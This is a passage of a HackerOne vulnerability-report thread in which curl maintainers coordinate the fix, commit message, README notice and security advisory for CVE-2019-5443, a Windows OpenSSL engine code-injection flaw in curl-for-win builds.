now.\u003c/p\u003e\n","automated_response":false,"created_at":"2019-06-17T12:45:45.538Z","updated_at":"2019-06-17T12:45:45.538Z","actor":{"username":"vsz","cleared":false,"url":"/vsz","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/643/721/fde2d78348b717d0e9e169e1803f95a73bdb21b7_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"curl","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":5146436,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@mirchr, I think it would've been forthright of you to have mentioned by now that you already published this flaw for at least one other project, tweeted about it and discussed it in public even before telling us about it.\n\nNow, we get this same report told from several sources since the cat is already out of the bag. We need to drastically shorten the time span to release of this and since the details are already public, we don't need to sync with anyone.\n\n@vsz how do you feel about uploading a patched release on Monday 24 of June? I will get the advisory done and see if I can get the CVE to also happen.","markdown_message":"\u003cp\u003e\u003ca href=\"/mirchr\"\u003e@mirchr\u003c/a\u003e, I think it would\u0026#39;ve been forthright of you to have mentioned by now that you already published this flaw for at least one other project, tweeted about it and discussed it in public even before telling us about it.\u003c/p\u003e\n\n\u003cp\u003eNow, we get this same report told from several sources since the cat is already out of the bag. We need to drastically shorten the time span to release of this and since the details are already public, we don\u0026#39;t need to sync with anyone.\u003c/p\u003e\n\n\u003cp\u003e\u003ca href=\"/vsz\"\u003e@vsz\u003c/a\u003e how do you feel about uploading a patched release on Monday 24 of June? I will get the advisory done and see if I can get the CVE to also happen.\u003c/p\u003e\n","automated_response":false,"created_at":"2019-06-20T14:42:03.469Z","updated_at":"2019-06-20T14:42:21.348Z","actor":{"username":"bagder","cleared":false,"url":"/bagder","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/459/380/963f64725677dda4f5113219588e7d0c1ab9abaa_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"curl","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":5146474,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@vsz: how about building and uploading a fixed version ASAP and then we work on getting the advisory with CVE out  as soon as possible after that? The two could be done asynch and getting a fixed version up as soon as possible would be good.","markdown_message":"\u003cp\u003e\u003ca href=\"/vsz\"\u003e@vsz\u003c/a\u003e: how about building and uploading a fixed version ASAP and then we work on getting the advisory with CVE out  as soon as possible after that? The two could be done asynch and getting a fixed version up as soon as possible would be good.\u003c/p\u003e\n","automated_response":false,"created_at":"2019-06-20T14:51:15.869Z","updated_at":"2019-06-20T14:51:15.869Z","actor":{"username":"bagder","cleared":false,"url":"/bagder","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/459/380/963f64725677dda4f5113219588e7d0c1ab9abaa_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"curl","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":5146552,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@bagder Hindsight is 20/20. I apologize for not disclosing that. It was not my intention to withhold the information.  I have been handling this as a per application vulnerability.  That blog post was for a specific closed source application(which was discovered back in February) and the main goal was to inform others of a potential vulnerability.  I had not looked at curl prior writing the blog. If I had, I would have held off releasing that information until a patch was available.\n","markdown_message":"\u003cp\u003e\u003ca href=\"/bagder\"\u003e@bagder\u003c/a\u003e Hindsight is 20/20. I apologize for not disclosing that. It was not my intention to withhold the information.  I have been handling this as a per application vulnerability.  That blog post was for a specific closed source application(which was discovered back in February) and the main goal was to inform others of a potential vulnerability.  I had not looked at curl prior writing the blog. If I had, I would have held off releasing that information until a patch was available.\u003c/p\u003e\n","automated_response":false,"created_at":"2019-06-20T15:10:43.861Z","updated_at":"2019-06-20T15:10:43.861Z","actor":{"username":"mirchr","cleared":true,"url":"/mirchr","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/d5WVwYt8n5pYhhom1mNPokFG/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"curl","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5147650,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I can do a build/upload right away. It will be a single commit to curl-for-win. Any suggestion for the commit message? (How brief, any wording preference, etc)","markdown_message":"\u003cp\u003eI can do a build/upload right away. It will be a single commit to curl-for-win. Any suggestion for the commit message? (How brief, any wording preference, etc)\u003c/p\u003e\n","automated_response":false,"created_at":"2019-06-20T16:04:37.701Z","updated_at":"2019-06-20T16:04:37.701Z","actor":{"username":"vsz","cleared":false,"url":"/vsz","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/643/721/fde2d78348b717d0e9e169e1803f95a73bdb21b7_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"curl","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":5147765,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Commit message draft:\n```\nOpenSSL config load fixes\n\n- fix to _really_ disable OpenSSL automatic config loading in curl\n  and libcurl.\n  original commit with this intention, but wrong macro name:\n     https://github.com/curl/curl-for-win/commit/fb80105b91a5dbbc390c9e6c2dcbc9a7e43601d2\n  curl commit implementing this feature:\n     https://github.com/curl/curl/commit/6684653b682bae0be75ea62bb473b126923952f1\n- fix OpenSSL build to use the non-world-writable prefix\n  `C:/Windows/System32/OpenSSL/` for config/certificate/engine/etc\n  paths hard-coded into OpenSSL binaries.\n  The build uses a minor patch to OpenSSL's ./Configure script to make\n  it recognize a Windows absolute path as an absolute one.\n  The default path `/usr/local` may result privilege escalation.\n  Note that above OpenSSL patch is NOT confirmed or endorsed by upstream\n  at this time. However, due to the weight of the issue, it was decided\n  to make this exception from curl-for-win's local-patching policy.\n```","markdown_message":"\u003cp\u003eCommit message draft:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eOpenSSL config load fixes\n\n- fix to _really_ disable OpenSSL automatic config loading in curl\n  and libcurl.\n  original commit with this intention, but wrong macro name:\n     https://github.com/curl/curl-for-win/commit/fb80105b91a5dbbc390c9e6c2dcbc9a7e43601d2\n  curl commit implementing this feature:\n     https://github.com/curl/curl/commit/6684653b682bae0be75ea62bb473b126923952f1\n- fix OpenSSL build to use the non-world-writable prefix\n  `C:/Windows/System32/OpenSSL/` for config/certificate/engine/etc\n  paths hard-coded into OpenSSL binaries.\n  The build uses a minor patch to OpenSSL\u0026#39;s ./Configure script to make\n  it recognize a Windows absolute path as an absolute one.\n  The default path `/usr/local` may result privilege escalation.\n  Note that above OpenSSL patch is NOT confirmed or endorsed by upstream\n  at this time. However, due to the weight of the issue, it was decided\n  to make this exception from curl-for-win\u0026#39;s local-patching policy.\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","automated_response":false,"created_at":"2019-06-20T16:23:23.851Z","updated_at":"2019-06-20T16:23:38.761Z","actor":{"username":"vsz","cleared":false,"url":"/vsz","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/643/721/fde2d78348b717d0e9e169e1803f95a73bdb21b7_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"curl","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":5148049,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@vsz I think that looks good, it is sufficiently vaguely phrased while at the same time remaining accurate and complete.","markdown_message":"\u003cp\u003e\u003ca href=\"/vsz\"\u003e@vsz\u003c/a\u003e I think that looks good, it is sufficiently vaguely phrased while at the same time remaining accurate and complete.\u003c/p\u003e\n","automated_response":false,"created_at":"2019-06-20T17:11:03.811Z","updated_at":"2019-06-20T17:11:03.811Z","actor":{"username":"dgustafsson","cleared":false,"url":"/dgustafsson","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"curl","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":5152027,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"CVE-2019-5443 has been assigned this flaw for us.","markdown_message":"\u003cp\u003eCVE-2019-5443 has been assigned this flaw for us.\u003c/p\u003e\n","automated_response":false,"created_at":"2019-06-20T21:17:52.749Z","updated_at":"2019-06-20T21:17:52.749Z","actor":{"username":"bagder","cleared":false,"url":"/bagder","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/459/380/963f64725677dda4f5113219588e7d0c1ab9abaa_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"curl","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":5152032,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@vsz for the record, I too approve of the commit message!","markdown_message":"\u003cp\u003e\u003ca href=\"/vsz\"\u003e@vsz\u003c/a\u003e for the record, I too approve of the commit message!\u003c/p\u003e\n","automated_response":false,"created_at":"2019-06-20T21:19:59.551Z","updated_at":"2019-06-20T21:19:59.551Z","actor":{"username":"bagder","cleared":false,"url":"/bagder","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/459/380/963f64725677dda4f5113219588e7d0c1ab9abaa_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"curl","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":5152036,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Okay, here's my first advisory draft for this issue. I'll adjust the dates when we know exactly when the update gets available and we publish this advisory.\n\nWindows OpenSSL engine code injection \n=====================================\n\nProject curl Security Advisory, June 24th 2019 -\n[Permalink](https://curl.haxx.se/docs/CVE-2019-5443.html)\n\nVULNERABILITY\n-------------\n\nA non-privileged user/program can put code and a config file in a known\nnon-privileged path (under `C:/usr/local/`) that will make curl automatically\nrun the code (as an openssl \"engine\") on invocation. If that curl is invoked\nby a privileged user it can do anything it wants.\n\nThis flaw exists in the official curl-for-windows binaries built and hosted by\nthe curl project (all versions up to and including 7.65.1_1). It **does not**\nexist in the curl executable shipped by Microsoft, bundled with Windows 10. It\npossibly exists in other curl builds for Windows too that uses OpenSSL.\n\nThere exists proof of concept exploits of this flaw.\n\nINFO\n----\n\nThis bug sneaked in due to insecure default build options in OpenSSL when\nbuilt cross-compiled.\n\nThe Common Vulnerabilities and Exposures (CVE) project has assigned the name\nCVE-2019-5443 to this issue.\n\nCWE-94: Code Injection\n\nSeverity: High\n\nAFFECTED VERSIONS\n-----------------\n\n- Affected versions: all curl-for-windows downloads before 7.65.1_2\n\nTHE SOLUTION\n------------\n\nReplace your downloaded curl version on Windows with the updated download\npackage from the [curl site](https://curl.haxx.se/windows/).\n\nRECOMMENDATIONS\n--------------\n\nWe suggest you take one of the following actions immediately, in order of\npreference:\n\n A - Upgrade to a fixed curl executable\n\n B - Remove curl executable downloaded from curl.haxx.se and instead use the\n     one shipped by Microsoft in Windows 10\n\nTIMELINE\n--------\n\nThe issue was reported to the curl project on June 12, 2019. The fix was done,\nverified and communicated with the reporter on June 12, 2019.\n\nWhile planning the release schedule of this advisory and coordinating with\nother affected projects, we discovered that this exact flaw had already been\npublished and discussed in public before we were informed about it. A few\nother OpenSSL-using projects on Windows also had already fixed their builds\nfor this exact problem. Realizing this, we switched gears and decided to\npublish as soon as possible.\n\ncurl 7.65.1_2 was uploaded and made available on June 20 2019\n\nThis advisory was posted on .\n\nCREDITS\n-------\n\nReported by Rich Mirch. OpenSSL patch by Viktor Szakats.\n\nThanks a lot!\n","markdown_message":"\u003cp\u003eOkay, here\u0026#39;s my first advisory draft for this issue. I\u0026#39;ll adjust the dates when we know exactly when the update gets available and we publish this advisory.\u003c/p\u003e\n\n\u003ch1 id=\"windows-openssl-engine-code-injection\"\u003eWindows OpenSSL engine code injection \u003c/h1\u003e\n\n\u003cp\u003eProject curl Security Advisory, June 24th 2019 -\u003cbr\u003e\n\u003ca href=\"/redirect?url=https%3A%2F%2Fcurl.haxx.se%2Fdocs%2FCVE-2019-5443.html\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ePermalink\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003ch2 id=\"vulnerability\"\u003eVULNERABILITY\u003c/h2\u003e\n\n\u003cp\u003eA non-privileged user/program can put code and a config file in a known\u003cbr\u003e\nnon-privileged path (under \u003ccode\u003eC:/usr/local/\u003c/code\u003e) that will make curl automatically\u003cbr\u003e\nrun the code (as an openssl \u0026quot;engine\u0026quot;) on invocation. If that curl is invoked\u003cbr\u003e\nby a privileged user it can do anything it wants.\u003c/p\u003e\n\n\u003cp\u003eThis flaw exists in the official curl-for-windows binaries built and hosted by\u003cbr\u003e\nthe curl project (all versions up to and including 7.65.1_1). It \u003cstrong\u003edoes not\u003c/strong\u003e\u003cbr\u003e\nexist in the curl executable shipped by Microsoft, bundled with Windows 10. It\u003cbr\u003e\npossibly exists in other curl builds for Windows too that uses OpenSSL.\u003c/p\u003e\n\n\u003cp\u003eThere exists proof of concept exploits of this flaw.\u003c/p\u003e\n\n\u003ch2 id=\"info\"\u003eINFO\u003c/h2\u003e\n\n\u003cp\u003eThis bug sneaked in due to insecure default build options in OpenSSL when\u003cbr\u003e\nbuilt cross-compiled.\u003c/p\u003e\n\n\u003cp\u003eThe Common Vulnerabilities and Exposures (CVE) project has assigned the name\u003cbr\u003e\nCVE-2019-5443 to this issue.\u003c/p\u003e\n\n\u003cp\u003eCWE-94: Code Injection\u003c/p\u003e\n\n\u003cp\u003eSeverity: High\u003c/p\u003e\n\n\u003ch2 id=\"affected-versions\"\u003eAFFECTED VERSIONS\u003c/h2\u003e\n\n\u003cul\u003e\n\u003cli\u003eAffected versions: all curl-for-windows downloads before 7.65.1_2\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003ch2 id=\"the-solution\"\u003eTHE SOLUTION\u003c/h2\u003e\n\n\u003cp\u003eReplace your downloaded curl version on Windows with the updated download\u003cbr\u003e\npackage from the \u003ca href=\"/redirect?url=https%3A%2F%2Fcurl.haxx.se%2Fwindows%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ecurl site\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e.\u003c/p\u003e\n\n\u003ch2 id=\"recommendations\"\u003eRECOMMENDATIONS\u003c/h2\u003e\n\n\u003cp\u003eWe suggest you take one of the following actions immediately, in order of\u003cbr\u003e\npreference:\u003c/p\u003e\n\n\u003cp\u003eA - Upgrade to a fixed curl executable\u003c/p\u003e\n\n\u003cp\u003eB - Remove curl executable downloaded from curl.haxx.se and instead use the\u003cbr\u003e\n     one shipped by Microsoft in Windows 10\u003c/p\u003e\n\n\u003ch2 id=\"timeline\"\u003eTIMELINE\u003c/h2\u003e\n\n\u003cp\u003eThe issue was reported to the curl project on June 12, 2019. The fix was done,\u003cbr\u003e\nverified and communicated with the reporter on June 12, 2019.\u003c/p\u003e\n\n\u003cp\u003eWhile planning the release schedule of this advisory and coordinating with\u003cbr\u003e\nother affected projects, we discovered that this exact flaw had already been\u003cbr\u003e\npublished and discussed in public before we were informed about it. A few\u003cbr\u003e\nother OpenSSL-using projects on Windows also had already fixed their builds\u003cbr\u003e\nfor this exact problem. Realizing this, we switched gears and decided to\u003cbr\u003e\npublish as soon as possible.\u003c/p\u003e\n\n\u003cp\u003ecurl 7.65.1_2 was uploaded and made available on June 20 2019\u003c/p\u003e\n\n\u003cp\u003eThis advisory was posted on .\u003c/p\u003e\n\n\u003ch2 id=\"credits\"\u003eCREDITS\u003c/h2\u003e\n\n\u003cp\u003eReported by Rich Mirch. OpenSSL patch by Viktor Szakats.\u003c/p\u003e\n\n\u003cp\u003eThanks a lot!\u003c/p\u003e\n","automated_response":false,"created_at":"2019-06-20T21:21:55.076Z","updated_at":"2019-06-20T21:21:55.076Z","actor":{"username":"bagder","cleared":false,"url":"/bagder","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/459/380/963f64725677dda4f5113219588e7d0c1ab9abaa_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"curl","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":5152582,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks guys for the review \u0026 feedback! Pushed the fix: https://github.com/curl/curl-for-win/commit/51b658a76594942cf1d6f227d8fc4732bb8ec277\n\n(CVE id/URL not included in the commit message. I can add this in a subsequent commit if necessary.)","markdown_message":"\u003cp\u003eThanks guys for the review \u0026amp; feedback! Pushed the fix: \u003ca title=\"https://github.com/curl/curl-for-win/commit/51b658a76594942cf1d6f227d8fc4732bb8ec277\" href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fcurl%2Fcurl-for-win%2Fcommit%2F51b658a76594942cf1d6f227d8fc4732bb8ec277\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://github.com/curl/curl-for-win/commit/51b658a76594942cf1d6f227d8fc4732bb8ec277\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003e(CVE id/URL not included in the commit message. I can add this in a subsequent commit if necessary.)\u003c/p\u003e\n","automated_response":false,"created_at":"2019-06-20T22:11:01.366Z","updated_at":"2019-06-20T22:11:01.366Z","actor":{"username":"vsz","cleared":false,"url":"/vsz","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/643/721/fde2d78348b717d0e9e169e1803f95a73bdb21b7_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"curl","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":5152769,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I can also add a reference to the exact curl-for-win commit from the advisory.","markdown_message":"\u003cp\u003eI can also add a reference to the exact curl-for-win commit from the advisory.\u003c/p\u003e\n","automated_response":false,"created_at":"2019-06-20T22:13:32.977Z","updated_at":"2019-06-20T22:13:32.977Z","actor":{"username":"bagder","cleared":false,"url":"/bagder","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/459/380/963f64725677dda4f5113219588e7d0c1ab9abaa_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"curl","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":5152923,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Sound good to me! Though since the first build failed with some intermittent download error I can still force push a commit message update with the CVS and link. (I wasn't sure if that's appropriate)","markdown_message":"\u003cp\u003eSound good to me! Though since the first build failed with some intermittent download error I can still force push a commit message update with the CVS and link. (I wasn\u0026#39;t sure if that\u0026#39;s appropriate)\u003c/p\u003e\n","automated_response":false,"created_at":"2019-06-20T22:35:49.919Z","updated_at":"2019-06-20T22:36:31.609Z","actor":{"username":"vsz","cleared":false,"url":"/vsz","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/643/721/fde2d78348b717d0e9e169e1803f95a73bdb21b7_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"curl","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":5152926,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Should I?","markdown_message":"\u003cp\u003eShould I?\u003c/p\u003e\n","automated_response":false,"created_at":"2019-06-20T22:36:14.984Z","updated_at":"2019-06-20T22:36:14.984Z","actor":{"username":"vsz","cleared":false,"url":"/vsz","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/643/721/fde2d78348b717d0e9e169e1803f95a73bdb21b7_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"curl","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":5152958,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"(Probably not). Instead, I'm going to include a reference in README.md suggesting to upgrade to 7.65.1_2 or newer, with CVE ID and URL. That's more visible than a commit message anyway.","markdown_message":"\u003cp\u003e(Probably not). Instead, I\u0026#39;m going to include a reference in README.md suggesting to upgrade to 7.65.1_2 or newer, with CVE ID and URL. That\u0026#39;s more visible than a commit message anyway.\u003c/p\u003e\n","automated_response":false,"created_at":"2019-06-20T22:40:16.272Z","updated_at":"2019-06-20T22:40:16.272Z","actor":{"username":"vsz","cleared":false,"url":"/vsz","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/643/721/fde2d78348b717d0e9e169e1803f95a73bdb21b7_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"curl","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":5152962,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"You can certainly refer to the CVE and the link to the (future) publication of it, I can't see any harm in that.","markdown_message":"\u003cp\u003eYou can certainly refer to the CVE and the link to the (future) publication of it, I can\u0026#39;t see any harm in that.\u003c/p\u003e\n","automated_response":false,"created_at":"2019-06-20T22:40:40.390Z","updated_at":"2019-06-20T22:40:40.390Z","actor":{"username":"bagder","cleared":false,"url":"/bagder","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/459/380/963f64725677dda4f5113219588e7d0c1ab9abaa_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"curl","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":5153044,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I wanted to avoid a force push. Here's the README diff, referencing the CVS, which I'll also include in the commit message for good measure:\n```diff\ndiff --git a/README.md b/README.md\nindex ade15b7..43aa657 100644\n--- a/README.md\n+++ b/README.md\n@@ -4,6 +4,14 @@\n \n # Automated, reproducible, transparent, Windows builds for [curl](https://curl.haxx.se/), [nghttp2](https://nghttp2.org/), [brotli](https://github.com/google/brotli), [libssh2](https://libssh2.org/) and [OpenSSL 1.1](https://www.openssl.org/)\n \n+  - NOTICE: It is strongly recommended to upgrade to curl 7.65.1_2 and\n+    OpenSSL 1.1.1c_2, released on 2019-06-20, or newer. Previous releases\n+    were discovered to have a privilege escalation vulnerability\n+    triggered via OpenSSL's build configuration defaults when using certain\n+    Windows compilers, including MinGW. The issue has been fixed by applying\n+    local OpenSSL patch along with the required build configuration change.\n+    Further information:\n+    [CVE-2019-5443](https://curl.haxx.se/docs/CVE-2019-5443.html)\n   - Packaging aims to follow popular binary releases found on the internet.\n   - Both x64 and x86 packages are built using the same process.\n   - Binary packages are downloadable in `.zip` and `.tar.xz` formats.\u003cbr\u003e\n```\n","markdown_message":"\u003cp\u003eI wanted to avoid a force push. Here\u0026#39;s the README diff, referencing the CVS, which I\u0026#39;ll also include in the commit message for good measure:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight diff\"\u003e\u003ccode\u003e\u003cspan class=\"gh\"\u003ediff --git a/README.md b/README.md\nindex ade15b7..43aa657 100644\n\u003c/span\u003e\u003cspan class=\"gd\"\u003e--- a/README.md\n\u003c/span\u003e\u003cspan class=\"gi\"\u003e+++ b/README.md\n\u003c/span\u003e\u003cspan class=\"p\"\u003e@@ -4,6 +4,14 @@\u003c/span\u003e\n\n # Automated, reproducible, transparent, Windows builds for [curl](https://curl.haxx.se/), [nghttp2](https://nghttp2.org/), [brotli](https://github.com/google/brotli), [libssh2](https://libssh2.org/) and [OpenSSL 1.1](https://www.openssl.org/)\n\n+  - NOTICE: It is strongly recommended to upgrade to curl 7.65.1_2 and\n\u003cspan class=\"gi\"\u003e+    OpenSSL 1.1.1c_2, released on 2019-06-20, or newer. Previous releases\n+    were discovered to have a privilege escalation vulnerability\n+    triggered via OpenSSL\u0026#39;s build configuration defaults when using certain\n+    Windows compilers, including MinGW. The issue has been fixed by applying\n+    local OpenSSL patch along with the required build configuration change.\n+    Further information:\n+    [CVE-2019-5443](https://curl.haxx.se/docs/CVE-2019-5443.html)\n\u003c/span\u003e   - Packaging aims to follow popular binary releases found on the internet.\n   - Both x64 and x86 packages are built using the same process.\n   - Binary packages are downloadable in `.zip` and `.tar.xz` formats.\u0026lt;br\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","automated_response":false,"created_at":"2019-06-20T23:10:16.491Z","updated_at":"2019-06-20T23:10:16.491Z","actor":{"username":"vsz","cleared":false,"url":"/vsz","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/643/721/fde2d78348b717d0e9e169e1803f95a73bdb21b7_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"curl","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":5153050,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Build finished: https://ci.appveyor.com/project/curlorg/curl-for-win/builds/25432145","markdown_message":"\u003cp\u003eBuild finished: \u003ca title=\"https://ci.appveyor.com/project/curlorg/curl-for-win/builds/25432145\" href=\"/redirect?url=https%3A%2F%2Fci.appveyor.com%2Fproject%2Fcurlorg%2Fcurl-for-win%2Fbuilds%2F25432145\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://ci.appveyor.com/project/curlorg/curl-for-win/builds/25432145\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n","automated_response":false,"created_at":"2019-06-20T23:11:29.701Z","updated_at":"2019-06-20T23:11:29.701Z","actor":{"username":"vsz","cleared":false,"url":"/vsz","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/643/721/fde2d78348b717d0e9e169e1803f95a73bdb21b7_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"curl","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":5153723,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@vsz I tested the latest build and it looks good. Great work!","markdown_message":"\u003cp\u003e\u003ca href=\"/vsz\"\u003e@vsz\u003c/a\u003e I tested the latest build and it looks good. Great work!\u003c/p\u003e\n","automated_response":false,"created_at":"2019-06-21T00:04:56.102Z","updated_at":"2019-06-21T00:04:56.102Z","actor":{"username":"mirchr","cleared":true,"url":"/mirchr","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/d5WVwYt8n5pYhhom1mNPokFG/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"curl","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5153730,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thank you, good to hear!","markdown_message":"\u003cp\u003eThank you, good to hear!\u003c/p\u003e\n","automated_response":false,"created_at":"2019-06-21T00:09:47.181Z","updated_at":"2019-06-21T00:09:47.181Z","actor":{"username":"vsz","cleared":false,"url":"/vsz","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/643/721/fde2d78348b717d0e9e169e1803f95a73bdb21b7_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"curl","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":5157342,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks @vsz, I'll also remove all older versions from the site to make it harder for people to download an older vulnerable version in case they have some old link saved.\n\nIf nobody has any objections or particular edits to the advisory, I'll try to publish that later today or tomorrow. (National holiday here today so family-time will interfere a bit.)","markdown_message":"\u003cp\u003eThanks \u003ca href=\"/vsz\"\u003e@vsz\u003c/a\u003e, I\u0026#39;ll also remove all older versions from the site to make it harder for people to download an older vulnerable version in case they have some old link saved.\u003c/p\u003e\n\n\u003cp\u003eIf nobody has any objections or particular edits to the advisory, I\u0026#39;ll try to publish that later today or tomorrow. (National holiday here today so family-time will interfere a 